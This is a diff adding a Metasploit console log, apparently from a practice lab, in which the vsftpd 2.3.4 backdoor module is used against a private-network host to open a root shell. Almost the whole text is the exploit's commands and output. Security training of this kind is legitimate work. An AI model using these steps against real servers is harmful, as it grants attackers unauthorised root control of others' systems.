@@ -1,0 +1,32 @@
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  21               yes       The target port
+
+msf exploit(vsftpd_234_backdoor) > set RHOST 10.0.0.100
+RHOST => 10.0.0.100
+msf exploit(vsftpd_234_backdoor) > exploit
+
+[*] Banner: 220 (vsFTPd 2.3.4)
+[*] USER: 331 Please specify the password.
+[+] Backdoor service has been spawned, handling...
+[+] UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (10.0.0.101:45083 -> 10.0.0.100:6200) 
+    at 2016-04-23 09:34:08 -0400
+
+who
+msfadmin tty1         Apr 23 09:02
+root     pts/0        Apr 23 08:57 (:0.0)
+whoam
+sh: line 6: whoam: command not found
+whoami
+root
+
+exit
+
+[*] 10.0.0.100 - Command shell session 1 closed.  Reason: Died from EOFError
